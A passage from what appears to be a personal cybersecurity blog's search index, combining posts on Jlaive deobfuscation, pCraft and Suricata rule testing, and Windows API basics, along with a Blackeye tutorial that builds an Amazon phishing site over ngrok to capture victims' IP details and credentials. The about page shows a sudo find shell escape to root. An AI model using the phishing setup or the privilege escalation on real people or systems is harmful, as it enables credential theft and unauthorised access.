[*] Extracting and decrypting the loader_stub. Writting result to loader_stub.exe [*] Parsing loader_stub.exe to decrypt the final executable... [*] Resource \u0026#39;payload.txt\u0026#39; extracted to \u0026#39;payload_extracted.txt\u0026#39; [+] Main method found: [*] Module: tmpBBD0.tmp [*] Method: System.Void qCaVAPJGIk.OItkKtykOO::Main(System.String[]) [*] Loading instructions of Main... [*] Key found: \u0026#34;8AOx7b0fGddReqjf+6WzB7n6yOJGvgsGZXvpBa9764w=\u0026#34; [*] IV found: \u0026#34;T1D5QuS4MCdJRbPrcYCB/Q==\u0026#34; [*] Original executable recovered successfully. Writing to \u0026#39;target_exe.exe\u0026#39;... ┌──(connar㉿kali)-[~/Documents/JlaiveCustomDeobfuscator] └─$ ls cleared_Jlaive.ps1 dnlib-4.4.0 loader_stub.exe obfuscated.bat payload_extracted.txt target_exe.exe tmp_Jlaive.ps1 unjlaive.py wzpaloqi.0.cs References\n[1] scmagazine: Obfuscation tool ‘BatCloak’ evades 80% of AV engines\r[2] Jose Luis Sánchez Martínez: Using Jlaive to create batch files from .NET assemblies for defense evasion\r[3] Dump-GUY: Get-UnJlaive\r[3] DuMp-GuY TrIcKsTeR: Get-UnJlaive - Jlaive Protector Reconstructor\r","permalink":"http://localhost:1313/posts/jlaive/","summary":"\u003ch2 id=\"what-will-this-post-be-about\"\u003eWhat will this post be about\u003c/h2\u003e\n\u003cp\u003eThis post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: \u003cstrong\u003eHow to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.\u003c/strong\u003e\u003c/p\u003e","title":"Exploring the Jlaive and UnJlaive tool"},{"content":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.\nIn summary, we need to run the following commands:\n{ \u0026#34;1) systemctl start docker\u0026#34;:\u0026#34;Starts docker\u0026#34;, \u0026#34;2) sudo docker pull sightingdb/pcraft\u0026#34;:\u0026#34;Pulls the docker image of the tool\u0026#34;, \u0026#34;3) docker run --name pcraft -d sightingdb/pcraft\u0026#34;:\u0026#34;Runs the tool\u0026#34;, \u0026#34;4) docker ps -a\u0026#34;:\u0026#34;Finds the ID of the docker process running the tool\u0026#34;, \u0026#34;5) docker exec -it {ID} bash\u0026#34;:\u0026#34;Executes the container in bash (meaning we get a shell inside the docker container)\u0026#34; } After that, we should be inside the docker container and run the tool without any errors:\nbuilder@4079f88d957d:~/pcraft$ ls \u0026#39;#hello.ami#\u0026#39; ami dns.ami parsuricata pyami.cpython-38-x86_64-linux-gnu.so setup.py LICENSE amigraph.py dns.pcap pcraft requirements.txt tests README.md build-pluginsdoc.py doc pcrafter samples tools builder@4079f88d957d:~/pcraft$ ./pcrafter Syntax: ./pcrafter script.ami output.pcap script.ami The .ami file contains actions that will be triggered and displayed inside the generated .pcap file. These actions can contain anything you see on a network traffic, like DNS queries, data being transfered, TCP handshakes etc.\nExample of an ami file An example of a .ami file is the following:\nami_version 1\r$victimip = \u0026#34;192.168.0.55\u0026#34;\r$fakebankip = \u0026#34;185.199.108.153\u0026#34;\raction DnsRequest {\r$ip-src = $victimip\r$ip-dst = $fakebankip\r$domain = \u0026#34;mikrosoft.com\u0026#34;\rexec DNSConnection\r}\raction PostData {\rexec HTTPConnection\r$method = \u0026#34;POST\u0026#34;\r$client-content-type = \u0026#34;application/x-www-form-urlencoded\u0026#34;\r$client-content = \u0026#34;login=Alfred.Wallace@example.com\u0026amp;password=qwerty1234\u0026#34;\r} This will basically trigger a DNS request and the resolved domain will be \u0026ldquo;mikrosoft.com\u0026rdquo; (you could set up a rule to detect such names later as we will see).\nAfterwards, we specify that a PostData action will take place which basically transfers some data - and specifically some user credentials.\nGenerating a pcap file based on an ami scenario Let\u0026rsquo;s see that in action:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter dns.ami dns.pcap All plugins loaded! Opening Script File dns.ami Executing action DnsRequest using DNSConnection Executing action PostData using HTTPConnection HTTP Method:POST builder@4079f88d957d:~/pcraft$ We copy over to our localhost the dns.pcap to view it in wireshark and then open it:\n┌──(connar㉿kali)-[~/blog/pcraft_tool] └─$ docker cp 4079f88d957d:/home/builder/pcraft/dns.pcap . └─$ wireshark dns.pcap\u0026amp; The result is the following pcap:\n└─$ tshark -r dns.pcap 1 Mar 16, 2024 21:30:18.468122000 EET 192.168.0.55 → 1.1.1.1 DNS 73 Standard query 0x0000 A mikrosoft.com 2 Mar 16, 2024 21:30:18.468536000 EET 1.1.1.1 → 192.168.0.55 DNS 102 Standard query response 0x0000 A mikrosoft.com A 185.199.108.153 3 Mar 16, 2024 21:30:18.469148000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [SYN] Seq=0 Win=8192 Len=0 4 Mar 16, 2024 21:30:18.469714000 EET 185.199.108.153 → 192.168.0.55 TCP 54 80 → 9279 [SYN, ACK] Seq=0 Ack=0 Win=8192 Len=0 5 Mar 16, 2024 21:30:18.470133000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [ACK] Seq=1 Ack=0 Win=8192 Len=0 6 Mar 16, 2024 21:30:18.470577000 EET 192.168.0.55 → 185.199.108.153 HTTP 311 POST / HTTP/1.1 (application/x-www-form-urlencoded) 7 Mar 16, 2024 21:30:18.471097000 EET 192.168.0.55 → 185.199.108.153 TCP 54 80 → 9279 [ACK] Seq=1 Ack=1 Win=8192 Len=0 8 Mar 16, 2024 21:30:18.471399000 EET 185.199.108.153 → 192.168.0.55 HTTP 268 HTTP/1.1 200 OK (text/html) Opening it in Wireshark, we get the following:\nNote\nWe can remove this \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Hello, you!\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; by going to pCraft/build/lib/pcraft/plugins/HTTPConnection.py or generally modifying it to our liking.\nTesting suricata rules on custom pcap As I mentioned earlier, pcraft is a great tool at making your own pcaps and testing rules upon them. In this part of the post, we are going to follow up on the example of the Red Team Village (see references) and create our own suricata rule, ami file and then generate a pcap and use tcpreplay to test if our rule is successful upon the generated custom network file.\nCreate the ami file (newsuricata.ami) The ami file we will use is the following:\nami_version 1\raction TriggerSuricata {\rexec Suricata\r$ip-src = \u0026#34;172.17.0.2\u0026#34;\r$ip-dst = \u0026#34;185.199.108.153\u0026#34;\r$rule = \u0026#34;\u0026#34;\u0026#34;alert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query GrayHat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20200809; rev:1;)\u0026#34;\u0026#34;\u0026#34;\r} Note\nWe see that we exec Suricata. This file contains a domain called \"GrayHat\" as we will later see, so it uses this name as the $domain variable.\nCreate the Suricata rule (mydns.rule) The Suricata rule is a very simple one:\nalert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query Grayhat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20201020; rev:1;) It basically listens on all interfaces to find a dns query that contains the domain name \u0026ldquo;Grayhat\u0026rdquo;.\nTesting our rule Now that we have both the ami and the rule files ready, let\u0026rsquo;s generate the pcap file like we\u0026rsquo;ve seen previously:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter newsuricata.ami new.pcap The generated pcap is just a pcap that makes dns queries for the domain \u0026ldquo;Grayhat\u0026rdquo;:\nbuilder@4079f88d957d:~/pcraft$ tshark -r new.pcap 1 0.000000 172.17.0.2 ? 1.1.1.1 DNS 67 Standard query 0x0000 A grayhat 2 0.000409 1.1.1.1 ? 172.17.0.2 DNS 90 Standard query response 0x0000 A grayhat A 185.199.108.153 Now that we have a successfully generated pcap, let\u0026rsquo;s set up a listener with suricata (note that you must run the following as root user):\nroot@4079f88d957d:/home/builder/pcraft# suricata -S mydns.rule -i eth0 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - This is Suricata version 5.0.3 RELEASE running in SYSTEM mode 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - all 5 packet processing threads, 4 management threads initialized, engine started Then, we can just use tcpreplay with our previously generated pcap to replicate the traffic:\nbuilder@4079f88d957d:~/pcraft$ tcpreplay -i eth0 new.pcap Warning in interface.c:get_interface_list() line 93: May need to run as root to get access to all network interfaces. Fatal Error in sendpacket.c:sendpacket_open() line 544: failed to open device eth0: socket: Operation not permitted builder@4079f88d957d:~/pcraft$ sudo tcpreplay -i eth0 new.pcap Actual: 2 packets (157 bytes) sent in 0.000455 seconds Rated: 345054.9 Bps, 2.76 Mbps, 4395.60 pps Flows: 2 flows, 4395.60 fps, 2 flow packets, 0 non-flow Statistics for network device: eth0 Successful packets: 2 Failed packets: 0 Truncated packets: 0 Retried packets (ENOBUFS): 0 Retried packets (EAGAIN): 0 Now, moment of truth! Let\u0026rsquo;s see what has been written on /var/log/suricata/fast.log which basically contains alerts that get triggered based on matching suricata rules.\nroot@4079f88d957d:/home/builder/pcraft# cat /var/log/suricata/fast.log 03/17/2024-15:23:28.882746 [**] [1:20201020:1] DNS Query Grayhat [**] [Classification: (null)] [Priority: 3] {UDP} 172.17.0.2:4096 -\u0026gt; 1.1.1.1:53 Aaaaaand we got a successful alert! Isn\u0026rsquo;t this great?\npCraft seems like a great tool to play around and dive deeper into rules and custom traffic. I will definitely use this tool for training and maybe I\u0026rsquo;ll come back in the future with an extensive senario to take a look together.\nUntil next time everyone!\nReferences\n[1] Sans Technology Institute: Generating PCAP Files from YAML\r[2] github: pCraft repo\r[3] Red Team Village: Attacking Networks with pCraft\r","permalink":"http://localhost:1313/posts/pcraft/","summary":"\u003ch2 id=\"what-is-the-pcraft-tool\"\u003eWhat is the pCraft tool\u003c/h2\u003e\n\u003cp\u003epCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\u003c/p\u003e\n\u003ch2 id=\"installation\"\u003eInstallation\u003c/h2\u003e\n\u003cp\u003eTo install the tool, you can either clone it from its github repo:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/DevoInc/pCraft\"\u003ehttps://github.com/DevoInc/pCraft\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eor by using docker.\u003cbr\u003e\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.\u003c/p\u003e","title":"Exploring the pCraft tool"},{"content":"Intro As I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.\nWas exactly is an API When you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API. Generally, an api allows for two pieces of software to interact upon another. When it comes to programming, it allows your code to interact with the windows operating system.\nLet\u0026rsquo;s dive into what the Windows API is and why it\u0026rsquo;s crucial for software development on the Windows platform - but also for red teamers, threat actors and blue teamers as well.\nThe functionality of the Windows API The Windows API, or Windows Application Programming Interface, is an extensive collection of functions and procedures supplied by the Microsoft Windows operating system that utilizes memory addresses to access resources, manage memory, pass parameters to methods and much more. Imagine it as a toolkit that enables software developers to build applications capable of interacting with the Windows environment. For instance, tasks such as displaying content on the screen, modifying files, or querying the registry can all be accomplished through the Windows API. Microsoft provides thorough documentation for the Windows API, which you can explore here.\nBasically, when an application needs to perform an operation, it uses the Win32 API, which translates the request into SYSCALLs. These SYSCALLs are then executed by the kernel to make the necessary changes or perform the desired actions. We can see an overview of this process in the following diagram:\nMore specifically and for giving an example, the function flow of the calls made by a program that just wants to use the FileStream.Read method would be the following:\nWindows Jobs A Windows Job is directly supported by the Windows API through functions that allow you to create, manage, and monitor job objects. These job objects are part of the Windows OS\u0026rsquo;s resource management capabilities. In simpler terms, a job is a kernel object that is responsible for managing one or more processes that run on the system. Functions like CreateJobObject and OpenJobObject are part of the Windows API and provide the necessary tools to implement job management.\nCreateJobObject: This function is part of the Windows API and is used to create a job object. It provides a handle to the newly created job object, which can then be used with other job management functions: HANDLE hJob = CreateJobObject(NULL, TEXT(\u0026#34;ExampleJob\u0026#34;)); if (hJob == NULL) { // Handle error } OpenJobObject: This function is part of the Windows API and allows you to open an existing job object by name. It returns a handle to the job object, enabling further manipulation or querying: HANDLE hJob = OpenJobObject(JOB_OBJECT_ALL_ACCESS, FALSE, TEXT(\u0026#34;ExampleJob\u0026#34;)); if (hJob == NULL) { // Handle error } AssignProcessToJobObject: This function assigns a process to a job object. The process will then be subject to the limits and rules of the job object: #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { // Create a job object HANDLE hJob = CreateJobObject(NULL, TEXT(\u0026#34;ExampleJob\u0026#34;)); if (hJob == NULL) { printf(\u0026#34;CreateJobObject failed with error: %lu\\n\u0026#34;, GetLastError()); return 1; } // Create a process to assign to the job object STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); if (!CreateProcess(NULL, TEXT(\u0026#34;notepad.exe\u0026#34;), NULL, NULL, FALSE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi)) { printf(\u0026#34;CreateProcess failed with error: %lu\\n\u0026#34;, GetLastError()); CloseHandle(hJob); return 1; } // Assign the process to the job object if (!AssignProcessToJobObject(hJob, pi.hProcess)) { printf(\u0026#34;AssignProcessToJobObject failed with error: %lu\\n\u0026#34;, GetLastError()); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hJob); return 1; } printf(\u0026#34;Process assigned to job object successfully.\\n\u0026#34;); // Wait for the process to exit WaitForSingleObject(pi.hProcess, INFINITE); // Clean up handles CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hJob); return 0; } Layers of the Windows API Before we dive into the functionality of the API, it\u0026rsquo;s important to understand the layers and terminologies we\u0026rsquo;ll be referring to. The Win32 API, more commonly known as the Windows API, consists of several components that define its structure and organization. To simplify this, we\u0026rsquo;ll break down the Win32 API using a top-down approach: the API itself is the top layer, and the parameters for specific calls are the bottom layer. The table below outlines this top-down structure at a high level, with more detailed explanations to follow:\nHeader files vs Dll files Header files Header files contain definitions of functions that make up the API, such as ReadProcessMemory, but they do not include the actual code that implements these functions:\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; int main() { // Open the process with PROCESS_VM_READ access DWORD processID = 1234; // Replace with the target process ID HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, processID); if (hProcess == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;Failed to open process. Error: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; return 1; } // Address in the target process to read from LPCVOID baseAddress = (LPCVOID)0x7FF6ABCDEF00; // Replace with the actual address SIZE_T bytesRead; char buffer[256]; // Buffer to store the read data // Read memory from the target process if (ReadProcessMemory(hProcess, baseAddress, buffer, sizeof(buffer), \u0026amp;bytesRead)) { std::cout \u0026lt;\u0026lt; \u0026#34;Read \u0026#34; \u0026lt;\u0026lt; bytesRead \u0026lt;\u0026lt; \u0026#34; bytes from the process.\u0026#34; \u0026lt;\u0026lt; std::endl; // Do something with the data in buffer } else { std::cerr \u0026lt;\u0026lt; \u0026#34;Failed to read process memory. Error: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; } // Close the handle to the process CloseHandle(hProcess); return 0; } Here, we imported the windows.h header file that contains the declarations for all the Windows API functions, including ReadProcessMemory.\nThe implementation code is found in DLL files, which stands for Dynamic Link Libraries. A single DLL file can provide the implementations for multiple header files.\nSo basically, the windows.h header file includes, amongst others, the declaration of the ReadProcessMemory function:\nBOOL ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead ); This declaration tells the compiler what the function looks like, its name, return type, and parameters. However, it does not provide the actual implementation of the function. The code of this function is inside the corresponding dll.\nDll files When a function like ReadProcessMemory is called, the system locates the corresponding DLL that contains the implementation of this function. For many Windows API functions, this DLL is kernel32.dll. How is the header file connected with the dll and the function name call is described below:\nLinking Process Compilation: During the compilation, the compiler uses the header files to understand the structure and usage of the functions. It ensures that the function calls in our code match the declarations in the header files. Linking: During the linking phase, the linker resolves the references to these functions by linking them to the corresponding DLL files that contain the actual implementation. For ReadProcessMemory, the linker ensures that the call in our code will be linked to the kernel32.dll. Runtime: At runtime, when the program execution reaches a call to ReadProcessMemory, the Windows operating system loads kernel32.dll (if it is not already loaded) and resolves the address of the ReadProcessMemory function. The program then jumps to that address to execute the function. So when our previous code calls the ReadProcessMemory, the process that happens can be summorized as:\nInclude Header File: You include windows.h in your source file. This header file contains the declaration of ReadProcessMemory: #include \u0026lt;windows.h\u0026gt; Link to DLL: The linker ensures that your program is linked with kernel32.dll, where ReadProcessMemory is implemented. Call the Function: When you call ReadProcessMemory in your code, the compiled program contains a placeholder that will be resolved to the actual address of the function in kernel32.dll at runtime: if (ReadProcessMemory(hProcess, baseAddress, buffer, sizeof(buffer), \u0026amp;bytesRead)) { // Successfully read memory } Execution: At runtime, when ReadProcessMemory is called, the operating system ensures that kernel32.dll is loaded into memory, finds the ReadProcessMemory function within the DLL, and executes it. Windows data types Windows data types and conventions refer to the specific data types and coding conventions used in Windows programming. These conventions are established by Microsoft to ensure consistency and compatibility across Windows applications. Here\u0026rsquo;s a breakdown of some key aspects:\nData Types: Basic Data Types: Windows programming uses basic data types like int, char, float, etc., similar to standard C and C++ programming. Platform-Specific Data Types: Windows also defines its own data types, often prefixed with DWORD, LP, HANDLE, etc. These data types are designed to accommodate various platform-specific requirements, such as memory management, inter-process communication, and file handling. Unicode Support: Windows APIs often use Unicode for text manipulation. As a result, data types like wchar_t (wide character) and functions prefixed with W (e.g., CreateWindowW) are commonly used to support Unicode strings. Pointer Types: Windows APIs use pointer types like LPVOID (pointer to void), LPCSTR (pointer to constant string), LPWSTR (pointer to wide string), etc., for memory management and passing parameters. Conventions: Naming Conventions: Windows APIs and data types typically follow a consistent naming convention. For example, function names often start with a capital letter (e.g., CreateWindow) and use CamelCase. Constants are often named in uppercase (e.g., HWND_TOPMOST). Error Handling: Windows APIs often use error codes, typically represented as DWORD values, to indicate the success or failure of operations. Functions usually return BOOL values (TRUE for success, FALSE for failure) or specific error codes (e.g., ERROR_SUCCESS, ERROR_FILE_NOT_FOUND). Function naming conventions Many times you will come upon function that generally look the same, but usually they will have a suffix to them. For example:\nFunction() // This is the generic name and is compatible with both ANSI and Unicode encodings FunctionA() // Indicates ANSI encoding FunctionW() // Indicates Unicode encoding You will also come across other functions with the suffix Ex like FunctionEx() which stands for extended. So a function ending with Ex provides extended control over the execution of a specific task:\nThere are many other different function naming conventions that are less straight forward like:\nNtCreateFile() GetFileAttributesExA() but their use can be matched to the components to which the function belongs with the help of the following table: Demo 1 - Viewing the API calls from python We are now going to use python to open a file with write permissions and monitor the journey of the calls being made to the system.\nStep 1 - Open python To start of, we need to open a python terminal and write the following line:\n\u0026gt;\u0026gt;\u0026gt; open(\u0026#34;C:\\\\Users\\\\connar\\\\Desktop\\\\proof_of_concept.txt\u0026#34;, \u0026#34;w\u0026#34;) Before running this line, let\u0026rsquo;s open WinDbg and attach the python process to it.\nStep 2 - Attaching python process to WinDbg To attach the python process to WinDbg, simply go to File \u0026ndash;\u0026gt; Attach to Process \u0026ndash;\u0026gt; Double click python process.\nStep 3 - Putting a breakpoint at CreateFileW Because python uses CreateFileW (the Unicode version as we previously discussed) to write to files, we need to breakpoint the calls being made to CreateFileW:\nWe can see that after breakpointing the calls to CreateFileW, resuming the process and running it, we got a hit on KERNELBASE!CreateFileW. The reason its KERNELBASE and not KERNEL32 is that Microsoft at some point decided to move part of functionality of KERNEL32 to KERNELBASE.\nNow, remember that we previously mentioned Win32 API uses memory addresses? Let\u0026rsquo;s view the contents of the rcx register by using the display unicode command:\nAaand we got the parameter given to our open() python function, or in other words the CreateFileW method:\nHANDLE CreateFileW( [in] LPCWSTR lpFileName, \u0026lt;-- First parameter is the filename [in] DWORD dwDesiredAccess, [in] DWORD dwShareMode, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, [in] DWORD dwCreationDisposition, [in] DWORD dwFlagsAndAttributes, [in, optional] HANDLE hTemplateFile ); In this simple example, we got a general idea of how a simple script that on the outside seems to just use the open() function, ended up calling CreateFileW and passing as argument (found in the rcx) the first parameter that CreateFileW accepts, which is the name of the file we are trying to open.\nThis is more or less what is happening behind the scenes when we call functions on our programs. WinAPI calls the corresponding dll\u0026rsquo;s to take care of the task and communicate with the kernel.\nDemo 2 - Viewing the API calls from notepad.exe In the previous demo we saw the series of calls that happened in Windows API when we tried to write to a file using a python script, with the help of WinDbg.\nIn this demo we are about to see the same thing but for notepad.exe this time and also by using a different program named ApiMonitor.\nApiMonitor is a tool used to \u0026hellip; well, monitor API calls being made by applications.\nUpon downloading and opening it, we need to find the following three API calls and check them:\nKernel32!CreateFileA Kernel32!CreateFileW ntdll!NtCreateFile These are some of the most popular API calls that usually happen when trying to create a file, so we will check them in order to only monitor them. To check them, you need to navigate to the \u0026ldquo;API Filter\u0026rdquo; pane, click display and then CTRL+F searching for the name \u0026ldquo;CreateFile\u0026rdquo;:\nAfter we have checked the mentioned three API calls, let\u0026rsquo;s monitor the notepad.exe process by navigating to File\u0026ndash;\u0026gt;Monitor New Process\u0026hellip; and then finding the notepad.exe:\nNote that if you don\u0026rsquo;t have a file named \u0026ldquo;filetest.txt\u0026rdquo;, the program will create it for you.\nWe can now see the API calls that notepad.exe made. We can view more info about one of those calls - such as the parameters used - by clicking one of them:\nWhat we can tell from the parameters is that they exactly match the structure of the CreateFileW we saw earlier. Another thing we can note by also looking back at a previous image, is that CreateFileW was made by user mode and ended up being executed by the kernel mode, thus the extra call to NtCreateFile (which comes from NtDll).\nReferences\n[1] Guided Hacking: What is the Windows API? What is Windows.h?\r[2] Nir Lichtman: How Windows API Works Under the Hood\r[3] Kavishka Gihan: Introduction to Windows API\r[3] PMA 403. API Monitor\r[4] Pavel Yosifovich: Windows Internals for .NET Developers\r","permalink":"http://localhost:1313/posts/windowsapi/","summary":"\u003ch3 id=\"intro\"\u003eIntro\u003c/h3\u003e\n\u003cp\u003eAs I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.\u003c/p\u003e\n\u003ch3 id=\"was-exactly-is-an-api\"\u003eWas exactly is an API\u003c/h3\u003e\n\u003cp\u003eWhen you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API. Generally, an api allows for two pieces of software to interact upon another. When it comes to programming, it allows your code to interact with the windows operating system.\u003cbr\u003e\nLet\u0026rsquo;s dive into what the Windows API is and why it\u0026rsquo;s crucial for software development on the Windows platform - but also for red teamers, threat actors and blue teamers as well.\u003c/p\u003e","title":"Learning about Windows API"},{"content":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option. Setup of blackeye Its very quick and easy to set up blackeye. All you have to do is the following:\n┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ git clone https://github.com/EricksonAtHome/blackeye.git Cloning into \u0026#39;blackeye\u0026#39;... remote: Enumerating objects: 305, done. remote: Counting objects: 100% (161/161), done. remote: Compressing objects: 100% (119/119), done. remote: Total 305 (delta 68), reused 127 (delta 38), pack-reused 144 Receiving objects: 100% (305/305), 2.68 MiB | 1.73 MiB/s, done. Resolving deltas: 100% (92/92), done. ┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ cd blackeye ┌──(connar㉿kali)-[~/blog/black_eye_tool/blackeye] └─$ ./blackeye.sh :: Disclaimer: Developers assume no liability and are not :: :: responsible for any misuse or damage caused by BlackEye. :: :: Only use for educational purporses!! :: :: BLACKEYE By @EricksonAtHome :: [01] Instagram [17] DropBox [33] eBay [02] Facebook [18] Line [34] Amazon [03] Snapchat [19] Shopify [35] iCloud [04] Twitter [20] Messenger [36] Spotify [05] Github [21] GitLab [37] Netflix [06] Google [22] Twitch [38] Reddit [07] Origin [23] MySpace [39] StackOverflow [08] Yahoo [24] Badoo [40] Custom [09] Linkedin [25] VK [10] Protonmail [26] Yandex [11] Wordpress [27] devianART [12] Microsoft [28] Wi-Fi [13] IGFollowers [29] PayPal [14] Pinterest [30] Steam [15] Apple ID [31] Tiktok [16] Verizon [32] Playstation ┌─[ Choose an option:]─[~] └──╼ ~ 34 1.Ngrok 2.Localtunnel To continue, we need to set Ngrok server. We can download the binary from the ngrok website. Afterwards, we need to do the following steps:\n└─$ sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz └─$ sudo mv ngrok /usr/local/bin The final step is to set your auth token which can be found by making an account on the ngrok dashboard. There, you will find your auth token and then can do the last step, which is:\n└─$ ngrok config add-authtoken [your_auth_token] We can now switch back to blackeye and choose option 1:\n─[ Choose the tunneling method:]─[~] └──╼ ~ 1 [*] Starting php server... [*] Starting ngrok server... [*] Send this link to the Victim: [*] Use shortened link instead: [*] Waiting victim open the link ... To get the link, we have to run the ngrok binary we previously downloaded. The port it runs on is 5555 by default and can be found inside its code (and edited of course to listen to some other port like 8080):\n└─$ ngrok http 5555 ngrok (Ctrl+C to quit) Take our ngrok in production survey! https://forms.gle/[redacted] Session Status online Account [redacted] (Plan: Free) Version 3.8.0 Region [redacted] ([redacted]) Latency 362ms Web Interface http://127.0.0.1:4040 Forwarding https://[redacted].ngrok-free.app -\u0026gt; http://localhost:5555 Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00 Now that the server is running our phishing amazon site, let\u0026rsquo;s head back to blackeye:\n[*] Waiting victim open the link ... [*] IP Found! [*] IPv6: [redacted] [*] User-Agent: [redacted] [*] Country: [redacted] [*] Region: [redacted] [*] City: [redacted] [*] Postal: [redacted] [*] Location: [redacted] [*] Maps: [redacted] [*] ISP: [redacted] [*] Timezone: [redacted] [*] Saved: amazon/saved.ip.txt [*] Waiting credentials ... Visiting the url provided in the running ngrok instance, we are met with the following website:\nWe provide some rogue credentials and we have our result: ","permalink":"http://localhost:1313/posts/phishingsite/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eIn this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: \u003ca href=\"http://localhost:1313/posts/bitb/\" title=\"BitB post\"\u003eBitB\u003c/a\u003e ).\u003cbr\u003e\nThere are plenty of tools out there to quickly set up a phishing website. For example:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSocialphish\u003c/li\u003e\n\u003cli\u003eShell Phish\u003c/li\u003e\n\u003cli\u003eZphisher\u003c/li\u003e\n\u003cli\u003eBlackeye\nand plenty others, but also platforms like gophish.\u003cbr\u003e\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"setup-of-blackeye\"\u003eSetup of blackeye\u003c/h2\u003e\n\u003cp\u003eIts very quick and easy to set up blackeye. All you have to do is the following:\u003c/p\u003e","title":"Setting up a phishing site [using blackeye tool]"},{"content":" connar@localhost:~$ whoami unknown@kali:~$ whoami unknown unknown@kali:~$ ls -l /home/unknown/identity.json -rw------- 1 root root 123 Oct 15 10:45 /home/unknown/identity.json unknown@kali:~$ cat /home/unknown/identity.json cat: /home/unknown/identity.json: Permission denied unknown@kali:~$ sudo -l [sudo] password for unknown: ************* Matching Defaults entries for unknown on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin User unknown may run the following commands on this host: (root) NOPASSWD: /usr/bin/find unknown@kali:~$ sudo find / -name identity.json -exec /bin/sh \\; -quit unknown@kali:~# whoami root unknown@kali:~# cat /home/unknown/identity.json { \u0026#34;Nickname\u0026#34;: \u0026#34;Connar\u0026#34;, \u0026#34;Location\u0026#34;: \u0026#34;Currently in NL\u0026#34;, \u0026#34;Interests\u0026#34;: [ \u0026#34;Forensics\u0026#34;, \u0026#34;Malware Analysis\u0026#34;, \u0026#34;Maldev\u0026#34;, \u0026#34;Social Engineering (phishing techniques)\u0026#34;, \u0026#34;Reverse Engineering\u0026#34;, \u0026#34;doxing techniques (I mean OSINT)\u0026#34; ], \u0026#34;Age\u0026#34;: \u0026#34;23\u0026#34; } purpose of the blog\rNote 1\rHi! Im connar. Im 23 and I am learning various cybersecurity topics and experimenting with different random tools I stumble upon.\nNote 2\rI am mainly into malware stuff (analysis and dev) but also into forensics. To be honest, I am no expert, 